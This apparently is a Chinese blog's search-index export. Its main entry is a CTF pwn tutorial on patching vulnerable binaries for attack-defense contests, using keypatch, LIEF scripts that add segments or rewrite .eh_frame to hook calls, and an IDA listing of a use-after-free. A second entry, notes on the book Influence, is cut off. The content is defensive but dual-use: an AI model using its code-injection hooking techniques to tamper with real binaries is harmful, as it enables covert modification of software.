<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>如何对pwn题进行patch</title>
      <link href="2021/05/30/%E5%A6%82%E4%BD%95%E5%AF%B9pwn%E9%A2%98%E8%BF%9B%E8%A1%8Cpatch/"/>
      <url>2021/05/30/%E5%A6%82%E4%BD%95%E5%AF%B9pwn%E9%A2%98%E8%BF%9B%E8%A1%8Cpatch/</url>
      
        <content type="html"><![CDATA[<h1 id="ida插件——kaypatch与findcrypt"><a href="#ida插件——kaypatch与findcrypt" class="headerlink" title="ida插件——kaypatch与findcrypt"></a>ida插件——kaypatch与findcrypt</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol><li><p>安装python3</p></li><li><p>更换pip源</p></li><li><p>以管理员身份运行cmd</p></li><li><pre><code>pip install pip            升级pip版本:&gt;&gt;&gt; pip install --user --upgrade pip            提示 No module named pip 解决方法：&gt;&gt;&gt; python -m ensurepip            （好像不进行这一步也问题不大pip install keystone-enginepip install sixpip install yara-python<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   &gt; 工具地址：https:&#x2F;&#x2F;github.com&#x2F;keystone-engine&#x2F;keypatch</span><br><span class="line">   &gt;</span><br><span class="line">   &gt; ​https:&#x2F;&#x2F;github.com&#x2F;polymorf&#x2F;findcrypt-yara</span><br><span class="line"></span><br><span class="line">   下载工具，并将&#96;keypatch.py&#96;、&#96;findcrypt3.py&#96;、 &#96;findcrypt3.rules&#96;放到ida的plugins目录，重启ida即可</span><br><span class="line"></span><br><span class="line">## 使用</span><br><span class="line"></span><br><span class="line">### keypatch</span><br><span class="line"></span><br><span class="line">edit - keypatch ，或者control+alt+k即可</span><br><span class="line"></span><br><span class="line">修改后可以看到旁边的注释，或者ctrl+alt+p 可以看到曾经的修改</span><br><span class="line"></span><br><span class="line">如果需要保存，edit - patch program - apply patches to input file ，然后ok即可</span><br><span class="line"></span><br><span class="line">### findcrypt</span><br><span class="line"></span><br><span class="line">Edit-&gt;Plugins-&gt;Findcrypt，具体的等遇到再补（摸了</span><br><span class="line"></span><br><span class="line"># 自动patch（限制execve等危险函数</span><br><span class="line"></span><br><span class="line">参考：[homura_pwn_waf](https:&#x2F;&#x2F;github.com&#x2F;wjbsyc&#x2F;homura_pwn_waf&#x2F;tree&#x2F;ed27c8dbdb48d08f858f150fb6ffdcc3ee14ee7a)</span><br><span class="line"></span><br><span class="line">可能的坑点：我在ubuntu20和mac本机上死活跑不通，缺一个keystone，即使我 &#96;pip install keystone-engine&#96;也不好使，但是我在裸ubuntu18上虽然也缺，但是&#96;pip install keystone-engine&#96;后就好了，可能是我之前尝试的地方都有python3的问题。</span><br><span class="line"></span><br><span class="line">结果我整了一天，装成功之后patch了程序跑不了。可能是程序本身调用了这些玩意？行吧，三点了，该睡了。</span><br><span class="line"></span><br><span class="line"># 手动patch</span><br><span class="line"></span><br><span class="line">## 栈溢出</span><br><span class="line"></span><br><span class="line">32位：更改参数大小即可</span><br><span class="line"></span><br><span class="line">64位：找到对应的寄存器</span><br><span class="line"></span><br><span class="line">## 格式化字符串</span><br><span class="line"></span><br><span class="line">### 方法一 更改函数</span><br><span class="line"></span><br><span class="line">如果有puts函数可以更改成函数的地址，即call _puts</span><br><span class="line"></span><br><span class="line">首先找到puts函数的plt表地址，然后找到call命令的下一条命令地址，相减得到偏移，如果是负数记得使用补码形式</span><br><span class="line"></span><br><span class="line">![](https:&#x2F;&#x2F;space.0bs3rver.workers.dev&#x2F;0bs3rver&#x2F;Picture&#x2F;master&#x2F;&#x2F;blogimg&#x2F;pwn-patch-1.png)</span><br><span class="line"></span><br><span class="line">E8 是操作码 后四位是偏移，注意x86是小端序 所以改成 E8 46 FE FF FF 即可</span><br><span class="line"></span><br><span class="line">但是这种方式有一个问题，因为puts函数是自动在输出的字符串尾部加入一个回车符，如果check脚本中是比较两次输入与输出是否全等，这种patch方法就不能过关。</span><br><span class="line"></span><br><span class="line">### 方法二 加入一个%s参数</span><br><span class="line"></span><br><span class="line">需要有汇编指令可供修改，参考 [pwn之简单patch](http:&#x2F;&#x2F;baijiahao.baidu.com&#x2F;s?id&#x3D;1680405668162970131&amp;wfr&#x3D;spider&amp;for&#x3D;pc)</span><br><span class="line"></span><br><span class="line">## uaf</span><br><span class="line"></span><br><span class="line">### lief</span><br><span class="line"></span><br><span class="line">lief是一个开源的跨平台的可执行文件修改工具，链接： https:&#x2F;&#x2F;github.com&#x2F;lief-project&#x2F;LIEF</span><br><span class="line"></span><br><span class="line">提供了python、C、C++等接口，用于解析&#x2F;修改各种不同平台&#x2F;格式的文件。</span><br><span class="line"></span><br><span class="line">python安装：&#96;sudo pip install lief&#96;</span><br><span class="line"></span><br><span class="line">它最新的安装包只支持python3.6以上，如果要用python2.7需要安装以前的包</span><br><span class="line"></span><br><span class="line">python2安装&#96;sudo pip install lief&#x3D;&#x3D;0.8.3.post3&#96;</span><br><span class="line"></span><br><span class="line">api文档：https:&#x2F;&#x2F;lief.quarkslab.com&#x2F;doc&#x2F;latest&#x2F;index.html</span><br><span class="line"></span><br><span class="line">### 增加segment</span><br><span class="line"></span><br><span class="line">这个方法的目的是增加一个程序段，在这个程序段中加入一个修复漏洞的程序代码，一般程序会在call某个函数时触发漏洞，一般语句为call 0x8041234，可以劫持这句话的逻辑，改成call我们定义的修复函数。</span><br><span class="line"></span><br><span class="line">示例代码如下：</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">  printf(&quot;&#x2F;bin&#x2F;sh%d&quot;,102);</span><br><span class="line">  puts(&quot;let&#39;s go\n&quot;);</span><br><span class="line">  printf(&quot;&#x2F;bin&#x2F;sh%d&quot;,102);</span><br><span class="line">  puts(&quot;let&#39;s gogo\n&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre></li></ol><p>如果我们想把第一个printf改成我们自己的逻辑，首先需要编译一个包含实现patch函数的静态库，比如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprintf</span><span class="params">(<span class="keyword">char</span> *a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">"mov %rdi,%rsi\n"</span></span><br><span class="line"><span class="string">"mov $0,%rdi\n"</span></span><br><span class="line"><span class="string">"mov $0x20,%rdx\n"</span></span><br><span class="line"><span class="string">"mov $0x1,%rax\n"</span></span><br><span class="line"><span class="string">"syscall\n"</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myputs</span><span class="params">(<span class="keyword">char</span> *a)</span></span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">"push $0x41414141\n"</span></span><br><span class="line"><span class="string">"push $0x42424242\n"</span></span><br><span class="line"><span class="string">"push %rsp\n"</span></span><br><span class="line"><span class="string">"pop  %rsi\n"</span></span><br><span class="line"><span class="string">"mov $0,%rdi\n"</span></span><br><span class="line"><span class="string">"mov $0x20,%rdx\n"</span></span><br><span class="line"><span class="string">"mov $0x1,%rax\n"</span></span><br><span class="line"><span class="string">"syscall\n"</span></span><br><span class="line"><span class="string">"pop %rax\n"</span></span><br><span class="line"><span class="string">"pop %rax\n"</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</span></span><br></pre></td></tr></table></figure><p>如上，将printf改成了write(0,”/bin/sh%d”,0x20)，利用注释的gcc命令将其编译。</p><p>patch程序的流程是首先将代码段加入到binary程序中，然后修改跳转逻辑，将call printf@plt，改成call myprintf。</p><p>lief中提供了add参数可以用于为二进制文件增加段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">binary    = lief.parse(binary_name)</span><br><span class="line">lib  = lief.parse(lib_name)</span><br><span class="line">segment_add = binary.add(lib.segments[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>在修改跳转语句部分，由程序的call执行寻址方法是相对寻址的，即call addr = EIP + addr</p><p>因此需要计算写入的新函数距离要修改指令的偏移，计算方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call xxx  &#x3D;(addr of new segment + offset function ) -  (addr of order + 5 &#x2F;*length of call xx*&#x2F;)</span><br></pre></td></tr></table></figure><p>由于偏移地址是补码表示的，因此在用python计算时需要对结果异或0xffffffff，最终patch脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lief</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_jmp</span><span class="params">(file,op,srcaddr,dstaddr,arch=<span class="string">"amd64"</span>)</span>:</span></span><br><span class="line">    length = (dstaddr-srcaddr<span class="number">-2</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(length)</span><br><span class="line">    order = chr(op)+chr(length)</span><br><span class="line">    <span class="keyword">print</span> disasm(order,arch=arch)</span><br><span class="line">    file.patch_address(srcaddr,[ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> order])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_call</span><span class="params">(file,srcaddr,dstaddr,arch=<span class="string">"amd64"</span>)</span>:</span></span><br><span class="line">    length = p32((dstaddr-srcaddr<span class="number">-5</span>)&amp;<span class="number">0xffffffff</span>)</span><br><span class="line">    order = <span class="string">'\xe8'</span>+length</span><br><span class="line">    print(disasm(order,arch=arch))</span><br><span class="line">    file.patch_address(srcaddr,[ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> order])</span><br><span class="line"></span><br><span class="line"><span class="comment"># add hook's patched func to binary as a new segment</span></span><br><span class="line">binary    = lief.parse(<span class="string">"a"</span>)</span><br><span class="line">hook  = lief.parse(<span class="string">"hook"</span>)</span><br><span class="line"></span><br><span class="line">segment_added = binary.add(hook.segments[<span class="number">0</span>])</span><br><span class="line">hook_fun = hook.get_symbol(<span class="string">"myprintf"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hook call delete_note</span></span><br><span class="line">dstaddr = segment_added.virtual_address + hook_fun.value</span><br><span class="line">srcaddr = <span class="number">0x400557</span></span><br><span class="line">patch_call(binary,srcaddr,dstaddr)</span><br><span class="line">binary.write(<span class="string">"patch_add_segment"</span>)</span><br></pre></td></tr></table></figure><p>可以看到确实patch成功了</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwn-patch-2.png"  alt=""></p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwn-patch-3.png"  alt=""></p><p>但是中间的hook编译时有点问题，我在不同的虚拟机上跑的hook，并不能成功，a.c 和 hook.c 在同一个地方编译，才成功，之后patch可能也需要注意这个问题。</p><p>不过缺点可以看到，文件大小变化很大，可能会被判定为通防或者宕机。</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwn-patch-4.png"  alt=""></p><h3 id="增加library"><a href="#增加library" class="headerlink" title="增加library"></a>增加library</h3><p>当程序中加载两个库时，在调用某一函数在两个库内同名存在时，是有一定查找顺序的，也就是可以实现，在不修改程序正常代码的前提下，对全部libc函数进行hook。</p><p>优势很明显，可以执行任意libc内函数代码，让编程更容易。</p><p>不过缺点也很明显，首先程序变得<strong>巨大</strong>，并且当不存在这个静态链接库的时候，程序跑不起来… </p><h3 id="修改程序-eh-frame段——重写函数调用"><a href="#修改程序-eh-frame段——重写函数调用" class="headerlink" title="修改程序.eh_frame段——重写函数调用"></a>修改程序.eh_frame段——重写函数调用</h3><p>感觉上改.en_frame是目前对程序改动最小的通用方案，.eh_frame段会加载到程序中来，并且自身带有可执行权限，如果我们把patch的放到这里，首先我们没有附加任何东西，所以对程序的大小影响不大，其次他自带可执行权限，非常方便，缺点可能就是.en_frame的大小有限。</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lief</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_jmp</span><span class="params">(file,op,srcaddr,dstaddr,arch=<span class="string">"amd64"</span>)</span>:</span></span><br><span class="line">    length = (dstaddr-srcaddr<span class="number">-2</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(length)</span><br><span class="line">    order = chr(op)+chr(length)</span><br><span class="line">    <span class="keyword">print</span> disasm(order,arch=arch)</span><br><span class="line">    file.patch_address(srcaddr,[ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> order])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_call</span><span class="params">(file,srcaddr,dstaddr,arch=<span class="string">"amd64"</span>)</span>:</span></span><br><span class="line">    length = p32((dstaddr-srcaddr<span class="number">-5</span>)&amp;<span class="number">0xffffffff</span>)</span><br><span class="line">    order = <span class="string">"\xe8"</span>+length</span><br><span class="line">    <span class="keyword">print</span> disasm(order,arch=arch)</span><br><span class="line">    file.patch_address(srcaddr,[ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> order])</span><br><span class="line"></span><br><span class="line"><span class="comment"># add hook's patched func to binary as a new segment</span></span><br><span class="line">binary = lief.parse(<span class="string">"./a"</span>)</span><br><span class="line">hook = lief.parse(<span class="string">"./hook"</span>)</span><br><span class="line"></span><br><span class="line">hook_sec = hook.get_section(<span class="string">".text"</span>)</span><br><span class="line">bin_eh_frame =  binary.get_section(<span class="string">".eh_frame"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hook_sec.content</span><br><span class="line"><span class="keyword">print</span> bin_eh_frame.content</span><br><span class="line"></span><br><span class="line">bin_eh_frame.content = hook_sec.content</span><br><span class="line"><span class="keyword">print</span> bin_eh_frame.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># hook call</span></span><br><span class="line">dstaddr = bin_eh_frame.virtual_address</span><br><span class="line">srcaddr = <span class="number">0x400557</span></span><br><span class="line">patch_call(binary,srcaddr,dstaddr)</span><br><span class="line"></span><br><span class="line">binary.write(<span class="string">"patch_md_ehframe"</span>)</span><br></pre></td></tr></table></figure><p>可以看到先跳到 .eh_frame 然后回来</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwn-patch-5.png"  alt=""></p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwn-patch-6.png"  alt=""></p><h3 id="修改程序-eh-frame段——指针清零"><a href="#修改程序-eh-frame段——指针清零" class="headerlink" title="修改程序.eh_frame段——指针清零"></a>修改程序.eh_frame段——指针清零</h3><p>pwn中的堆题最常见的漏洞就是free后指针未清零，我们尝试patch一下</p><p>我们以ciscn2021的loneywolf为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_C60</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Index: "</span>);</span><br><span class="line">  __isoc99_scanf(&amp;unk_F44, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 &amp;&amp; buf )</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以很明显的看到，存在free后未清零的问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000C60 ; __unwind &#123;</span><br><span class="line">.text:0000000000000C60                 sub     rsp, 18h</span><br><span class="line">.text:0000000000000C64                 lea     rsi, aIndex     ; &quot;Index: &quot;</span><br><span class="line">.text:0000000000000C6B                 mov     edi, 1</span><br><span class="line">.text:0000000000000C70                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000000C79                 mov     [rsp+18h+var_10], rax</span><br><span class="line">.text:0000000000000C7E                 xor     eax, eax</span><br><span class="line">.text:0000000000000C80                 call    ___printf_chk</span><br><span class="line">.text:0000000000000C85                 lea     rdi, unk_F44</span><br><span class="line">.text:0000000000000C8C                 xor     eax, eax</span><br><span class="line">.text:0000000000000C8E                 mov     rsi, rsp</span><br><span class="line">.text:0000000000000C91                 call    ___isoc99_scanf</span><br><span class="line">.text:0000000000000C96                 cmp     [rsp+18h+var_18], 0</span><br><span class="line">.text:0000000000000C9B                 jnz     short loc_CAE</span><br><span class="line">.text:0000000000000C9D                 mov     rdi, cs:buf     ; ptr</span><br><span class="line">.text:0000000000000CA4                 test    rdi, rdi</span><br><span class="line">.text:0000000000000CA7                 jz      short loc_CAE</span><br><span class="line">.text:0000000000000CA9                 call    _free</span><br><span class="line">.text:0000000000000CAE</span><br><span class="line">.text:0000000000000CAE loc_CAE:                                ; CODE XREF: sub_C60+3B↑j</span><br><span class="line">.text:0000000000000CAE                                         ; sub_C60+47↑j</span><br><span class="line">.text:0000000000000CAE                 mov     rax, [rsp+18h+var_10]</span><br><span class="line">.text:0000000000000CB3                 xor     rax, fs:28h</span><br><span class="line">.text:0000000000000CBC                 jnz     short loc_CC3</span><br><span class="line">.text:0000000000000CBE                 add     rsp, 18h</span><br><span class="line">.text:0000000000000CC2                 retn</span><br></pre></td></tr></table></figure><p>我们在.en_frame上随便找个地，然后开始对着改，需要注意的是字符串是通过计算偏移来实现的，更换地址后需要重新计算偏移。</p><p>old: arm_addr = 0xC64 + 0x7 = 0xc6b   str_addr =  0xf48    0xf48 - 0xc6b = 0x2dd</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwn-patch-7.png"  alt=""></p><p>new:  arm_addr = 0x1074 + 0x7 = 0x107b    str_addr = 0xf48    0xf48 - 0x107b = 0xfffffecd</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwn-patch-8.png"  alt=""></p><p>但是写着写着我发现有点不对劲，这一个个偏移算的很烦，而且有的指令还看起来不太对劲，比如<code>mov     [rsp+18h+var_10], rax</code>，我还没办法用keypatch直接改，仔细想想，我为什么要重复写这么一大坨玩意呢，我需要的只是加上几行命令而已，直接把一行改成跳转然后执行完了再跳回去不就得了。</p><p>这里我偷了个懒，直接把最后的canary检查给关了，其实不关也行，或者是干脆用这几行的空闲来加上patch，我这里主要是想试试jmp，keypatch会直接帮你计算偏移，确实好用</p><p>修改之后如下：</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwn-patch-9.png"  alt=""></p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwn-patch-10.png"  alt=""></p><p>反汇编如下：</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwn-patch-11.png"  alt=""></p><p>参考：</p><ul><li><a href="https://orangegzy.github.io/2020/09/13/CISCN2020-CTF-%E5%8D%8A%E5%86%B3%E8%B5%9B%E8%B5%9B%E5%89%8Dpatch%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">CISCN2020-CTF-半决赛赛前patch学习</a></li><li><a href="http://p4nda.top/2018/07/02/patch-in-pwn/" target="_blank" rel="noopener">CTF线下赛中常用的PWN题patch方法</a></li><li><a href="https://xz.aliyun.com/t/5868#toc-3" target="_blank" rel="noopener">记fast_bin attack到patch的三种手法</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> patch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《影响力》读书笔记（一）</title>
      <link href="2021/04/30/%E3%80%8A%E5%BD%B1%E5%93%8D%E5%8A%9B%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>2021/04/30/%E3%80%8A%E5%BD%B1%E5%93%8D%E5%8A%9B%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>前段时间看完了《怪诞心理学2》，这几天摸过来看《影响力》，其实运用场景还不少，索性写篇笔记，免得看完就忘。</p><h1 id="第一章-影响力的武器"><a href="#第一章-影响力的武器" class="headerlink" title="第一章 影响力的武器"></a>第一章 影响力的武器</h1><blockquote><p>一切都应该尽可能的简单，但不要太简单。        ——阿尔伯特 · 爱因斯坦</p></blockquote><h2 id="动物的固定行为模式"><a href="#动物的固定行为模式" class="headerlink" title="动物的固定行为模式"></a>动物的固定行为模式</h2><p>在动物身上，常常会表现出<strong>固定行为模式</strong>，例如雌火鸡辨别孩子的形式，仅仅是”吱吱“的叫声，无论是什么东西发出这种声音，哪怕是它的天敌黄鼠狼的标本，只要它发出了这种声音（通过录音机的方式），雌火鸡就会把它像自己的孩子一样呵护；而对于没能发出”吱吱“生的小火鸡，它的妈妈就会对它置之不理，甚至有时会杀死它。</p><p>这看起来荒诞可笑，但是我们需要意识到：</p><ul><li>绝大多数情况下，动物的这种机械的固定行为模式都起到了良好的作用。</li><li>我们体内也存在类似的行为模式。通常情况下，这些模式会帮助我们，但有时候也会愚弄我们。</li></ul><h2 id="人类的固定行为模式"><a href="#人类的固定行为模式" class="headerlink" title="人类的固定行为模式"></a>人类的固定行为模式</h2><p>有一条著名的行为准则：<strong>当我们请别人帮忙时，如果能够讲出一个理由，那我们得到别人帮助的可能性就更大。</strong></p><p>要说原因的话，就是人们喜欢为自己所做的事找一个理由。例如去复印的地方，请求人们让他先复印，说出理由（因为我有急事）的成功率（94%）远高于不说理由的成功率（60%），看起来是因为有急事人们才让他先复印，但第三次实验的时候，他的请求方式是：“对不起，我有五页纸要复印能不能让我先复印呢？因为我要复印五张纸”。这种方式没有给出额外的信息，但成功率和第一次相差无几（93%）。这说明<strong>因为</strong>这个词激发了人们下意识的顺从反应，即使这个词后面并没有给出什么令他们顺从的原因。</p><h2 id="警惕别人的利用"><a href="#警惕别人的利用" class="headerlink" title="警惕别人的利用"></a>警惕别人的利用</h2><p>我们当中的某些人，也会通过模拟触发特征，诱使我们下意识的作出某些反应。</p><p>例如我们获得优惠券，就会下意识的觉得我们获得了便宜，我们看到昂贵的产品，就会下意识的觉得它会更加优质。</p><p>我们对事物的感知也依赖于于比较，例如逛服装店，我们购买了昂贵的东西，就会接着购买不那么贵的配件——即使它们也相对昂贵且并不必要——我们看到了性价比极低的东西，就会觉得性价比中等的也不错，即使它们的性价比并不高。</p><p>我并不是觉得这种固定的行为模式不好，事实上我们不可能对每一个人，每一件事，每一种情况去细细的认知和分析。因此我们必须要经常使用我们从经验中得来的方法，按照事物的特征进行归类，但是不要过于依赖它。</p><h1 id="第二章-互惠"><a href="#第二章-互惠" class="headerlink" title="第二章 互惠"></a>第二章 互惠</h1><p>一个古老的原理：给予、索取……<strong>再索取</strong></p><blockquote><p>我们付每一笔债，就像上帝开的账单一样。    ——拉尔夫 · 沃尔多 · 爱默生</p></blockquote><h2 id="我们身边最有效的影响力的武器——互惠原理"><a href="#我们身边最有效的影响力的武器——互惠原理" class="headerlink" title="我们身边最有效的影响力的武器——互惠原理"></a>我们身边最有效的影响力的武器——互惠原理</h2><p><strong>互惠原理认为，我们应该尽力以相同的方式报答他人为我们所做的一切。</strong></p><p>社会学家阿尔文 · 